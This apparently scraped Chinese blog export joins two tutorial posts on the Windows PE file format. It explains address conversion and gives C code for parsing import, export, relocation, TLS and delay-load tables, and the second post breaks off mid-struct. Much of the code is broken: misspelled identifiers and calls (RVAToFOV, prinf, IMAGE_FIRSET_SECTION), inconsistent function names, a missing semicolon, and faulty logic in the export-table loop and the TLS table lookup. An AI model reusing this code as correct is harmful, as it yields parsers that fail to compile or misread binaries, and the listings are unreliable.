当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA) 数据目录表结构1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; // 虚拟地址，就是数据目录表的起始位置 DWORD Size; // 尺寸，起始地址 + 尺寸 = 结束的位置&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; Directory Entries12345678910111213141516#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory 导出表#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory 导入表#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory 资源表#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory 异常#define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory 安全#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table 重定位表#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory 调试信息// IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage)#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data 版权信息#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory TLS表#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers#define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table 导入函数地址表#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor 地址函数转换与PE结构有关的三种地址VA(虚拟地址)：PE文件映射到内存后的地址RVA(相对虚拟地址)：内存地址相对于映射基地址的偏移地址FileOffset(文件偏移地址)：相对PE文件在磁盘上的文件开头的偏移地址FOA &#x3D; RVA - HFOA &#x3D; VA - ImageBase - H 判断RVA是否在头部 FOA &#x3D; RVA 判断RVA位于哪个节 RVA &gt;&#x3D; Section[i]-&gt;VirtualAddress RVA &lt;&#x3D; Section[i]-&gt;VirtualAddress + 当前节内存对齐后的大小 FOA &#x3D; RVA - Section[i]-&gt;VirtualAddress + Section[i]-&gt;PointerToRawData 转换函数代码123456789101112131415161718192021222324DWORD RVAToFOA(DWORD dwRVA, char* buffer)&#123; // dwRVA 相对虚拟函数 buffer 已加载的文件内存映像 // DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT 头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 区段 PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader); // 判断是否落在头部 if(dwRVA &lt; pSectionHeader[0].VirtualAddress) &#123; return dwRVA; &#125; for(int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123; // 判断落在哪个区段 if(dwRVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize) &#123; return dwRVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData; &#125; &#125; return dwRVA;&#125; _IMAGE_IMPORT_DESCRIPTOR(导入表)IMAGE_IMPORT_DESCRIPTOR结构体123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; IMAGE_IMPORT_DESCRIPTOROriginalFirstThunk: 该字段指向导入名称表（INT）的RVA，该RVA指向的是一个IMAGE_THUNK_DATA的结构体TimeDateStamp: 该字段可以被忽略，一般为0即可ForwarderChain: 该字段一般为0Name: 该字段指向DLL名称的RVA地址FirstThunk: 该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA的结构体数组 IMAGE_THUNK_DATA结构体123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; IMAGE_THUNK_DATAForwarderString: 是转向它的第一个索引的函数的名称的RVAFunction: 代表输入函数的地址Ordinal: 代表该函数在导入DLL中的序号。只有当IMAGE_THUNK_DATA的最高位为1时才代表使用序号导入，此时低31位代表在导入DLL中该函数的序号AddressOfData: 指向IMAGE_IMPORT_BY_NAME的一个指针，它表示用函数名进行导入。当IMAGE_THUNK_DATA的最高位为0时代表使用函数名进行导入，此时这四个字节代表着IMAGE_IMPORY_BY_NAME的RVA每一个IMAGE_THUNK_DATA对应一个DLL中的导入函数。IMAGE_THUNK_DATA与IMAGE_IMPORT_DESCRIPORT类似，同样是一个以全”0”的IMAGE_THUNK_DATA为结束当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式导入，这时低31位被看作一个导入序号。当其最高位为0时；表示函数以函数名称字符串的方式导入，这时DWORD的值表示一个RVA，并指向一个IMAGE_IMPORT_BY_NAME结构体 IMAGE_IMPORT_BY_NAME结构体1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; CHAR Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; IMAGE_IMPORT_BY_NAMEHint: 该字段表示该函数在其导入表中的序号Name: 该字段表示导入函数的函数名。导入函数是一个以ASCII编码的字符串，并以NULL结尾。在IMAGE_IMPORT_BY_NAME中使用Name[1]来定义该字段，表示这是只有1个长度大小的字符串，但是函数名不可能只有一个字节的长度，通过越界访问来达到访问变长字符串的功能 注意IMAGE_IMPORT_DESCRIPTOR结构体中的OriginalFirstThunk和FirstThunk都指向了IMAGE_THUNK_DATA这个结构体，但是两者是有区别的。当文件在磁盘上时，两者指向的IMAGE_THUNK_DATA是相同的内容，而当文件被载入内存后，两者指向的就是不同的内容在磁盘上时，OriginalFirstThunk指向的IMAGE_THUNK_DATA中保存的是指向函数名的RVA，称其为INT。FirstThunk通常指向的IMAGE_THUNK_DATA中保存的也是指向函数名的RVA，它们在磁盘上是没有差异的当文件被载入内存后，OriginalFirstThunk指向的IMAGE_THUNK_DATA中保存的是指向函数名的RVA；FirstThunk通常指向的IMAGE_THUNK_DATA中由装载器填充的导入函数地址，称其为IAT。 解析导入表代码123456789101112131415161718192021222324252627282930313233DWORD PrintImportTable(char* buffer)&#123; // DOS 头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT 头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位导入表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); // 填充结构体 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(RVAToFOV(pData.Dir.VirtualAddress, buffer) + buffer); while(pImport-&gt;Name) &#123; char* szDllName = (char*)(RVAToFOA(pImport-&gt;Name, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, szDllName); printf(&quot;TimeDateStamp：%08x\\n&quot;, pImport-&gt;TimeDateStamp); printf(&quot;ForwarderChain：%08x\\n&quot;, pImport-&gt;ForwarderChain); printf(&quot;Name Offset：%08x\\n&quot;, pImport-&gt;Name); printf(&quot;FirstThunk：%08x\\n&quot;, pImport-&gt;FirstThunk); printf(&quot;OriginalFirstThunk：%08x\\n\\n&quot;, pImport-&gt;OriginalFirstThunk); PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(RVAToFOA(pImport-&gt;FirstThunk, buffer) + buffer); while(pIAT-&gt;u1.Ordinal != 0) &#123; if(!IMAGE_SNAP_BY_ORDINAL32(pIAT-&gt;u1.Ordinal)) &#123; PIMAGE_IMPORT_BY_NAME pFunctionName = (PIMAGE_IMPORT_BY_NAME)(RVAToFOA(pIAT-&gt;u1.AddressOfData, buffer) + buffer); printf(&quot;Function Name: %s\\n&quot;, pFunctionName); &#125; pIAT++; &#125; pImport++ &#125;&#125; _IMAGE_EXPORT_DIRECTORY(导出表)IMAGE_EXPORT_DIRECTORY结构体12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; IMAGE_EXPORT_DIRECTORYCharacteristics: 保留，必须为0TimeDateStamp: 时间戳MajorVersion: 主要版本号，主要和次要版本号可由用户设置MinorVersion: 次要版本号Name: 名称RVA，包含导出文件名称的ASCII字符串地址Base: 此映像中导出的起始序号，指定导出地址表（AddressOfFunctions）的起始序号，通常设置为1NumberOfFunctions: 导出函数的个数，导出地址表（AddressOfFunctions）中的条目数NumberOfNames: 按名称导出的函数个数，名称表（AddressOfFunctions）中的条目数，同样也是序号表（AddressOfNameOrdinals）中的条目数AddressOfFunctions: 导出地址表RVAAddressOfNames: 导出名称表RVAAddressOfNameOrdinals: 序号表RVA 解析导出表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061void PrintExportTable(char* buffer)&#123; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位导出表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); // 填充结构体 PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); if (pExport-&gt;AddressFunctions == 0) &#123; printf(&quot;当前没有导出表!\\n&quot;); return; &#125; char* szDllName = (char*)(RVAToFOA(pExport-&gt;Name, buffer) + buffer); printf(&quot;DllName: %s\\n&quot;, DllName); printf(&quot;Base: %#08x\\n&quot;, pExport-&gt;Base); printf(&quot;NumberOfFunctions: %#08x\\n&quot;, pExport-&gt;NumberOfFunctions); printf(&quot;NumberOfNames: %#08x\\n&quot;, pExport-&gt;NumberOfNames); printf(&quot;AddressOfFunctions: %#08x\\n&quot;, pExport-&gt;AddressOfFunctions); printf(&quot;AddressOfNames: %#08x\\n&quot;, pExport-&gt;AddressOfNames); printf(&quot;AddressOfNameOrdinals: %#08x\\n&quot;, pExport-&gt;AddressOfNameOrdinals); // 函数数量 DWORD dwNumberOfFunctions = pExport-&gt;NumberOfFunctions; // 函数名数量 DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; // Base DWORD dwBase = pExport-&gt;Base; // 导出地址表 PDWORD pExportAddrTable = (PDWORD)(RVAToFOA(pExport-&gt;AddressOfFunctions, buffer) + buffer); // 导出名称表 PDWORD pExportNameTable = (PDWORD)(RVAToFOA(pExport-&gt;AddressOfNames, buffer) + buffer); // 导出序号表 PWORD pExportIdTable = (PWORD)(RVAToFOA(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer); for(int i = 0; i &lt; dwNumberOfFunctions; i++) &#123; if(pExportAddrTable[i] == i) &#123; continue; &#125; DWORD id = 0; for (; id &lt; dwNumberOfNames; id++) &#123; if(pExportIdTable[i] == id) &#123; break; &#125; &#125; if (id == dwNumberOfNames) &#123; printf(&quot;ID: %x Address: %#08x Name[NULL]\\n&quot;, i + dwBase, pExportAddrTable[i]); &#125; else &#123; char* szFunName = (char*)(RVAToFileOffset(pExportNameTable[id], buffer) + buffer); printf(&quot;ID: %x Address: %#08x Name[%s]\\n&quot;, i + dwBase, pExportAddrTable[i], szFunName); &#125; &#125;&#125; _IMAGE_BASE_RELOCATION(重定位表)123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; DWORD SizeOfBlock;// WORD TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; _IMAGE_BASE_RELOCATIONVirtualAddress: 指向需要重定位地址的RVA，每个INAGE_BASE_RELOCATION只负责4kb大小分页内的重定位信息。因此结构中的VirtualAddress值为0x1000的倍数SizeOfBlock: imageBase结构体和TypeOffset的总和 重定位块的大小TypeOffset[1]: 自定义的一个字段，表示这个结构体下面会出现WORD类型的数组，该数组元素的就是硬编码在程序当中的偏移自定义TypeOffset结构typedef struct _TYPE{ WORD Offset: 12; &#x2F;&#x2F; 大小2bit重定位的偏移 WORD Type: 4;} TYPE, *PTYPE; Windows的PE装载器进行PE重定位处理的操作原理流程在应用程序当中查找硬编码位置读取之后减去ImageBase，也就是用VA - 基址 &#x3D; RVA加上实际加载地址得到真正的VA其中最关键的就是找到硬编码的位置，而要找到硬编码的位置，首先要找到基址重定位表，该表位于.reloc区段，找到基址重定位表的正确打开方式是通过数据目录表IMAGE_DATA_DIRECTORY条目查找 解析重定位表123456789101112131415161718192021222324252627282930313233343536373839void PrintBaseRelocTable(char* buffer)&#123; // 自定义TypeOffset结构 typedef struct _TYPE&#123; WORD Offset: 12; WORD Type: 4; &#125; TYPE, *PTYPE; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // SECTION Header PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRSET_SECTION(pNtHeader); // 定位重定位表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirtory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 填充结构体 PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); while(pBaseReloc-&gt;SizeOfBlock != 0) &#123; // 找到本0x1000个字节的起始位置 // 重定位个数 = （SizeOfBlock - 8（IMAGE_BASE_RELOCATION）） / 2（每个TypeOffset是2个字节） DWORD dwCount = (DWORD)(pBaseReloc-&gt;SizeOfBlock - 8) / 2; DWORD dwRVA = pBaseReloc-&gt;VirtualAddres; PTYPE pRelocAddr = (PTYPE)(pBaseReloc + 1); printf(&quot;SECTION: %#08X\\n&quot;, pSectionHeader-&gt;Name); printf(&quot;RVA: %#08X\\n&quot;, dwRVA); printf(&quot;ITEMS: %x H / %d D\\n&quot;, pBaseReloc-&gt;SizeOfBlock, pBaseReloc-&gt;SizeOfBlock); // 找到下一个0x1000个字节 pBaseReloc = (PIMAGE_BASE_RELOCATION)((char*)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); for (int i = 0; i &lt; dwCount; i++) &#123; PDWORD pData = (PDWORD)(RVAToFOA(pRelocAddr[i].Offset + dwRVA, buffer) + buffer); DWORD pDataOffset = RVAToFOA(pRelocAddr[i].Offset + dwRVA, buffer); printf(&quot;SECTION: %#08x\\n&quot;, *pData); printf(&quot;RVA: %#08x\\n&quot;, pRelocAddr[i].Offset + dwRVA); printf(&quot;OFFSET: %#08x\\n\\n&quot;, pDataOffset); &#125; &#125;&#125; _IMAGE_TLS_DIRECTORY(TLS表)1234567891011121314151617typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; DWORD EndAddressOfRawData; DWORD AddressOfIndex; // PDWORD DWORD AddressOfCallBacks; // PIMAGE_TLS_CALLBACK * DWORD SizeOfZeroFill; union &#123; DWORD Characteristics; struct &#123; DWORD Reserved0 : 20; DWORD Alignment : 4; DWORD Reserved1 : 8; &#125; DUMMYSTRUCTNAME; &#125; DUMMYUNIONNAME;&#125; IMAGE_TLS_DIRECTORY32;typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32; _IMAGE_TLS_DIRECTORY32StartAddressOfRawData: TLS初始化数据起始地址EndAddressOfRawData: TLS初始化结束地址，两个正好定位一个范围，范围放初始化的值AddressOfIndex: TLS索引位置AddressOfCallBacks: TLS回调函数的数组指针SizeOfZeroFill: 填充0的个数Characteristics: 保留TLS: 线程本地存储器，可以将数据与执行的特定线程联系起来。怎么理解？如果一个变量是全局的，那么所有线程访问的是同一份，某一个线程对其修改会影响其他所有线程。如果我们需要一个变量在每个线程中都能访问，并且值在每个线程中互不影响，这就是TLS。线程局部存储在不同平台有不同的实现，可移植性不好。线程局部存储不难实现，最简单的办法就是建立一个全局表，通过当前线程ID去查询相应的数据，因为各个线程ID不同，查到的数据自然也不同。 解析TLS表1234567891011121314151617void PrintTLSTable(char* buffer)&#123; // DOS PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer; // NT PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer); // 定位TLS表 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.VirtualAddres + IMAGE_DIRECTORY_ENTRY_TLS); // 填充结构体 PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(RVAToFOA(pDataDir-&gt;VirtualAddress, buffer) + buffer); prinf(&quot;StartAddressOfRawData: %#08x\\n&quot;, pTLS-&gt;StartAddressOfRawData); prinf(&quot;EndAddressOfRawData: %#08x\\n&quot;, pTLS-&gt;EndAddressOfRawData); prinf(&quot;AddressOfIndex: %#08x\\n&quot;, pTLS-&gt;AddressOfIndex); prinf(&quot;AddressOfCallBacks: %#08x\\n&quot;, pTLS-&gt;AddressOfCallBacks); prinf(&quot;SizeOfZeroFill: %#08x\\n&quot;, pTLS-&gt;SizeOfZeroFill); prinf(&quot;Characteristics: %#08x\\n&quot;, pTLS-&gt;Characteristics);&#125; _IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)12345678910111213141516171819typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR &#123; union &#123; DWORD AllAttributes; struct &#123; DWORD RvaBased : 1; // Delay load version 2 DWORD ReservedAttributes : 31; &#125; DUMMYSTRUCTNAME; &#125; Attributes; DWORD DllNameRVA; // RVA to the name of the target library (NULL-terminate ASCII string) DWORD ModuleHandleRVA; // RVA to the HMODULE caching location (PHMODULE) DWORD ImportAddressTableRVA; // RVA to the start of the IAT (PIMAGE_THUNK_DATA) DWORD ImportNameTableRVA; // RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData) DWORD BoundImportAddressTableRVA; // RVA to an optional bound IAT DWORD UnloadInformationTableRVA; // RVA to an optional unload info table DWORD TimeDateStamp; // 0 if not bound, // Otherwise, date/time of the target DLL&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR; 解析延时加载表1234567891011121314151617// DOSPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;// NTPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);// 定位DelayImportTablePIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);// 填充结构体PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(RVAToFileOffset(pDataDir-&gt;VirtualAddress, buffer) + buffer);char* szDllName = (char*)(RVAToFileOffset(pDelayLoad-&gt;DllNameRVA, buffer) + buffer);printf(&quot;%s\\n&quot;, szDllName);printf(&quot;Attributes: %#08x\\n&quot;, pDelayLoad-&gt;Attributes);printf(&quot;ModuleHandleRVA: %#08x\\n&quot;, pDelayLoad-&gt;ModuleHandleRVA);printf(&quot;ImportAddressTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;ImportAddressTableRVA);printf(&quot;ImportNameTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;ImportNameTableRVA);printf(&quot;BoundImportAddressTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;BoundImportAddressTableRVA);printf(&quot;UnloadInformationTableRVA: %#08x\\n&quot;, pDelayLoad-&gt;UnloadInformationTableRVA);printf(&quot;TimeDateStamp: %#08x\\n&quot;, pDelayLoad-&gt;TimeDateStamp);","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"Windows PE","slug":"Windows-PE","date":"2023-05-07T03:11:00.000Z","updated":"2023-12-14T13:17:06.486Z","comments":true,"path":"bd80384e.html","link":"","permalink":"http://example.com/bd80384e.html","excerpt":"Windows PE可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件可执行文件的格式：Windows 平台 PE（Portable Executable）文件结构Linux 平台 ELF（Executable and Linking Format）文件结构","text":"Windows PE可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件可执行文件的格式：Windows 平台 PE（Portable Executable）文件结构Linux 平台 ELF（Executable and Linking Format）文件结构 PE 文件结构PE 文件的整体结构PE 结构示例图 PE 文件主要结构PE 文件结构体宽度 结构体 宽度(字节) IMAGE_DOS_HEADER 64 IMAGE_FILE_HEADER 20 INAGE_OPTIONAL_HEADER32 244 IMAGE_SECTION_HEADER 40 PE 文件结构大小示例图 PE文件的两种状态PE文件的两种状态PE文件在运行前（静态，存储在磁盘上）和运行时（动态，运行在内存中）的格式是有差异的，这种差异对于我们理解PE文件是如何执行的来说很重要。我们在之前的文件分析过程中实际上所看到的是静态的内容，其大小是要根据FileAlignment的值进行文件对齐的，但是在运行时则整体按照扩展PE头的成员SectionAlignment的值进行内存对齐，默认情况下该值为0x1000： PE文件的两种状态 DOS头结构体12345678910111213141516171819202122typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic 为DOS可执行文件标识符，占用2字节，值为0x5A4De_lfanew 保存了PE头的起始位置 标准PE头12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; _IMAGE_NT_HEADERSSignature: PE标识, 值为0x00004550FileHeader: 文件头OptionalHeader: 扩展头 文件头（标准PE头）123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; _IMAGE_FILE_HEADERMachine: 该字段为WORD类型，占用2字节，该字段标识可执行文件的目标CPU类型NumberOfSections: 该字段为WORD类型，占用2字节，该字段标识PE文件的节区个数TimeDateStamp: 该字段表示编译器填写的时间戳与文件属性中（创建时间、修改时间无关），这个值是自1970年1月1日以来用格林威治时间计算的秒数PointerToSymbolTable: 该字段很少使用，调试相关NumberOfSymbols: 该字段很少使用，调试相关SizeOfOptionalHeader: 该字段为WORD类型，占用2字节；该字段指定IMAGE_OPTIONAL_HEADER结构大小(32位PE文件：0xEO 64位PE文件：0xF0)Characteristics: 该字段为WORD，占用2字节；该字段指定文件属性 Machine 字段取值范围 宏定义 值 意义 IMAGE_FILE_MACHINE_I386 0x014C Intel IMAGE_FILE_MACHINE_ALPHA 0x0184 DEC Alpha IMAGE_FILE_MACHINE_IA64 0x200 Intel(64-bit) IMAGE_FILE_MACHINE_AXP64 0x0284 DEC Alpha(64-bit) IMAGE_FILE_MACHINE_AMD64 0x8664 AMD64 (K8) Characteristics 字段取值范围 数据位 宏定义 值 为1时的含义 0 IMAGE_FILE_RELOCS_STRIPPED 0x0001 文件中不存在重定位信息 1 IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 文件是可执行的 2 IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 不存在行信息 3 IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 不存在符号信息 4 IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 调整工作集 5 IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 应用程序可处理大于2GB的地址 6 此标志位保留 7 IMAGE_FILE_BYTES_REVERSED_LO 0x0080 小尾方式 8 IMAGE_FILE_32BIT_MACHINE 0x0100 只在32平台运行 9 IMAGE_FILE_DEBUG_STRIPPED 0x0200 不包含调试信息 10 IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 不能从可移动盘运行 11 IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 不能从网络运行 12 IMAGE_FILE_SYSTEM 0x1000 系统文件（驱动程序），不能直接运行 13 IMAGE_FILE_DLL 0x2000 DLL文件 14 IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 文件不能在多处理器计算机上运行 15 IMAGE_FILE_BYTES_REVERSED_HI 0x8000 大尾方式 Characteristics 计算方式 C++1234例如：01020000 0001 0000 0010下标是1和8位为1；表示文件是一个可执行文件，只在32平台运行 可选头（扩展头）扩展头（32位） C++123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // 32位PE程序：10B 64位PE程序：20B 重要 BYTE MajorLinkerVersion; // 链接器版本号 BYTE MinorLinkerVersion; // 链接器版本号 DWORD SizeOfCode; // 所有代码节的总和，文件对齐后的大小，编译器填的 没用 DWORD SizeOfInitializedData; // 包含所有已经初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用 DWORD SizeOfUninitializedData; // 包含未初始化数据的节的总大小，文件对齐后的大小，编译器填的 没用 DWORD AddressOfEntryPoint; // 程序入口 重要 DWORD BaseOfCode; // 代码开始的基址，编译器填的 没用 DWORD BaseOfData; // 数据开始的基址，编译器填的 没用 DWORD ImageBase; // 内存镜像基址 重要 DWORD SectionAlignment; // 内存对齐 重要 DWORD FileAlignment; // 文件对齐 重要 WORD MajorOperatingSystemVersion; // 标识操作系统版本号 主版本号 WORD MinorOperatingSystemVersion; // 标识操作系统版本号 次版本号 WORD MajorImageVersion; // PE文件自身的版本号 WORD MinorImageVersion; // PE文件自身的版本号 WORD MajorSubsystemVersion; // 运行所需子系统版本号 WORD MinorSubsystemVersion; // 运行所需子系统版本号 DWORD Win32VersionValue; // 子系统版本值，必须位0 DWORD SizeOfImage; // 内存中整个PE文件的映射的尺寸，可比实际的值大，必须是SectionAlignment整数倍 重要 DWORD SizeOfHeaders; // 所有头 + 节表按照文件对齐后的大小，否则加载会出错 重要 DWORD CheckSum; // 校验和，一些系统文件有要求用来判断文件是否被修改 重要 WORD Subsystem; // 子系统 驱动程序（1）图形界面（2）控制台、DLL（3） WORD DllCharacteristics; // 文件特性 不是针对DLL文件的 DWORD SizeOfStackReserve; // 初始化时保留的栈大小 DWORD SizeOfStackCommit; // 初始化实际提交的大小 DWORD SizeOfHeapReserve; // 初始化保留的堆大小 DWORD SizeOfHeapCommit; // 